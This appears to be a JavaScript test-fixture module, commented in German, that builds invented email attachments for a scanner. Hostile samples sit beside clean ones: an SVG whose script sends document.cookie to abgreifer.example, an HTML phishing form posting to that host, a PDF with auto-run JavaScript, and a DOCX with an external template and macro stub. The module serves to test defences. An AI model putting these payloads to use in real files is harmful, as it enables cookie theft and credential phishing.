/*
 * anhang-muster.mjs — erfundene Anhänge für die Probe, im Test gebaut statt
 * eingecheckt: jede Datei trägt genau die Sorte, die sie beweisen soll, und
 * eine saubere Gegenrichtung steht daneben. Alle Namen und Nummern erfunden
 * (die IBAN ist das Lehrbuch-Beispiel).
 */
import zlib from "node:zlib";

const TAB = new Int32Array(256).map((_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1; return c; });
const crc = (b) => { let c = -1; for (const x of b) c = TAB[(c ^ x) & 255] ^ (c >>> 8); return (c ^ -1) >>> 0; };
const be32 = (n) => Buffer.from([n >>> 24 & 255, n >>> 16 & 255, n >>> 8 & 255, n & 255]);

function chunk(typ, daten) {
  const t = Buffer.from(typ, "latin1"); const d = Buffer.from(daten);
  return Buffer.concat([be32(d.length), t, d, be32(crc(Buffer.concat([t, d])))]);
}
/** echtes, lesbares PNG (w×h, rot-blau), optional mit tEXt und Anhängsel */
export function png({ w = 16, h = 12, text = null, hinten = null } = {}) {
  const roh = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) { const o = y * (w * 3 + 1) + 1 + x * 3; roh[o] = 200; roh[o + 2] = x * 12; }
  const ihdr = Buffer.concat([be32(w), be32(h), Buffer.from([8, 2, 0, 0, 0])]);
  const teile = [Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), chunk("IHDR", ihdr)];
  if (text) teile.push(chunk("tEXt", Buffer.from(text, "latin1")));
  teile.push(chunk("IDAT", zlib.deflateSync(roh)), chunk("IEND", Buffer.alloc(0)));
  if (hinten) teile.push(Buffer.from(hinten));
  return Buffer.concat(teile);
}
/** JPEG-Gerüst: SOI, APP1-Exif mit GPS-Verweis in IFD0, SOS, EOI, Anhängsel.
 *  Nur für die Struktur-Prüfung (nicht zeichenbar). */
export function jpegGeruest({ gps = true, hinten = null } = {}) {
  const tiff = Buffer.alloc(8 + 2 + 12 + 4);
  tiff.write("II", 0, "latin1"); tiff.writeUInt16LE(42, 2); tiff.writeUInt32LE(8, 4);
  tiff.writeUInt16LE(1, 8); tiff.writeUInt16LE(gps ? 0x8825 : 0x010F, 10); tiff.writeUInt16LE(4, 12); tiff.writeUInt32LE(1, 14); tiff.writeUInt32LE(0, 18);
  const app1 = Buffer.concat([Buffer.from("Exif\0\0", "latin1"), tiff]);
  const seg = (m, d) => Buffer.concat([Buffer.from([0xFF, m]), Buffer.from([(d.length + 2) >> 8, (d.length + 2) & 255]), d]);
  return Buffer.concat([Buffer.from([0xFF, 0xD8]), seg(0xE1, app1), seg(0xDA, Buffer.from([1, 1, 0, 0, 63, 0])),
    Buffer.from([0x12, 0x34, 0xFF, 0x00, 0x56]), Buffer.from([0xFF, 0xD9]), hinten ? Buffer.from(hinten) : Buffer.alloc(0)]);
}
export const SVG_BOESE = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60" onload="alert(1)">
 <script>fetch("https://abgreifer.example/x?"+document.cookie)</script>
 <image href="https://bilder.example/spion.png" width="1" height="1"/>
 <text x="4" y="20">Petra Beispiel · DE89 3704 0044 0532 0130 00</text>
</svg>`;
export const SVG_SAUBER = `<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40" fill="#0e6b72"/></svg>`;

/** ZIP (Office) — `packen: true` nimmt deflate-raw, sonst gespeichert */
export function zip(dateien, packen = false) {
  const lokal = [], zentral = []; let off = 0;
  for (const [name, inhalt] of dateien) {
    const n = Buffer.from(name, "utf8"), roh = Buffer.from(inhalt), art = packen ? 8 : 0;
    const d = packen ? zlib.deflateRawSync(roh) : roh, c = crc(roh);
    const h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt16LE(art, 8);
    h.writeUInt32LE(c, 14); h.writeUInt32LE(d.length, 18); h.writeUInt32LE(roh.length, 22); h.writeUInt16LE(n.length, 26);
    lokal.push(h, n, d);
    const z = Buffer.alloc(46); z.writeUInt32LE(0x02014b50, 0); z.writeUInt16LE(20, 4); z.writeUInt16LE(20, 6); z.writeUInt16LE(art, 10);
    z.writeUInt32LE(c, 16); z.writeUInt32LE(d.length, 20); z.writeUInt32LE(roh.length, 24); z.writeUInt16LE(n.length, 28); z.writeUInt32LE(off, 42);
    zentral.push(z, n); off += 30 + n.length + d.length;
  }
  const zb = Buffer.concat(zentral), e = Buffer.alloc(22);
  e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(dateien.length, 8); e.writeUInt16LE(dateien.length, 10);
  e.writeUInt32LE(zb.length, 12); e.writeUInt32LE(off, 16);
  return Buffer.concat([...lokal, zb, e]);
}
export function docxBoese(packen = true) {
  return zip([
    ["[Content_Types].xml", '<?xml version="1.0"?><Types/>'],
    ["word/document.xml", '<w:document><w:body><w:p><w:r><w:t>Bitte überweisen auf DE89 3704 0044 0532 0130 00</w:t></w:r></w:p><w:p><w:r><w:t>Rückruf: +49 170 1234567 &amp; Dank</w:t></w:r></w:p></w:body></w:document>'],
    ["word/_rels/document.xml.rels", '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://vorlagen.example/v.dotm" TargetMode="External"/></Relationships>'],
    ["word/vbaProject.bin", "MAKRO"],
    ["docProps/core.xml", "<cp:coreProperties><dc:creator>Eva Muster</dc:creator></cp:coreProperties>"],
  ], packen);
}
export function docxSauber() {
  return zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Guten Tag, anbei das Angebot.</w:t></w:r></w:p></w:body></w:document>"]], true);
}
export const PDF_BOESE = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n2 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n", "latin1");
export const PROGRAMM = Buffer.concat([Buffer.from("MZ", "latin1"), Buffer.alloc(64)]);

/* HTML-Anhang (2026-09-30): erfunden, jede Adresse endet auf .example (RFC 2606). */
export const HTML_BOESE = `<!DOCTYPE html>
<html lang="de"><head><meta charset="utf-8"><title>Ihre Rechnung</title>
<script src="https://abgreifer.example/sammeln.js"></script></head>
<body><p>Bitte melden Sie sich an.</p>
<img src="https://zaehler.example/p.gif" width="1" height="1" alt="">
<form action="https://abgreifer.example/login" method="post"><input name="pw" type="password"></form>
</body></html>`;
export const HTML_SAUBER = `<!DOCTYPE html>
<html lang="de"><head><meta charset="utf-8"><title>Einladung</title><style>p{color:#333}</style></head>
<body><p>Wir laden Sie herzlich ein. Mehr dazu auf <a href="https://verein.example/fest">unserer Seite</a>.</p>
<img src="bild.png"></body></html>`;  // ohne alt: für eine eigene Webseite ein Mangel, im Anhang keine Gefahr
